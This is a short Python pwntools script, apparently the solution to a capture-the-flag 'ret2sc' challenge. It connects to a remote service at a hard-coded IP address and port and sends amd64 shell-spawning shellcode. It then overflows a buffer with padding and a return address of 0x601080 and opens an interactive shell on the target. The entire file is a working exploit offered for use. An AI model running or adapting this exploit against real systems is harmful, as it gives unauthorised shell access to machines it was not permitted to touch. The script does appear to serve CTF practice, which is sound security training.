#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2122
r = remote(ip, prot)
#r = process("./ret2sc")
context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.amd64.linux.sh())
r.recvuntil("Name:")
r.sendline(shellcode)
r.recvuntil("Try your best:")
r.sendline(b"A"*32 + b"x" * 8 + p64(0x601080))

r.interactive()